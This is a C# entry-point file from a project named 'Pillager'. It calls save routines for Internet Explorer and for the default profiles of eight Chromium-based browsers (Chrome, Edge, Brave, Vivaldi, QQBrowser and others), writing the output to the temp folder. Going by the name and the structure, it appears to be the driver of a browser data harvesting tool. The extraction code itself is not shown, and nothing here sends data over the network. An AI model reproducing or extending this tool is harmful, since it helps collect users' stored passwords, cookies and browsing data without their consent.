using System;
using System.Collections.Generic;
using System.IO;
using Pillager.Browsers;

namespace Pillager
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string savepath = Path.GetTempPath();

            //IE
            IE.Save(savepath);

            //Chrome
            List<List<string>> browserOnChromium = new List<List<string>>()
            {
                new List<string>() { "Chrome", "Google\\Chrome\\User Data\\Default" } ,
                new List<string>() { "Chrome Beta", "Google\\Chrome Beta\\User Data\\Default" } ,
                new List<string>() { "Chromium", "Chromium\\User Data\\Default" } ,
                new List<string>() { "Edge", "Microsoft\\Edge\\User Data\\Default" } ,
                new List<string>() { "Brave-Browse", "BraveSoftware\\Brave-Browser\\User Data\\Default" } ,
                new List<string>() { "QQBrowser", "Tencent\\QQBrowser\\User Data\\Default" } ,
                new List<string>() { "Vivaldi", "Vivaldi\\User Data\\Default" } ,
                new List<string>() { "CocCoc", "CocCoc\\Browser\\User Data\\Default" } 
                //new List<string>() { "", "" } ,
            };
            foreach (List<string> browser in browserOnChromium)
            {
                string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                browser[1]);
                Chrome chrome = new Chrome(browser[0], chromepath);
                chrome.Save(savepath);                
            }
        }
    }
}
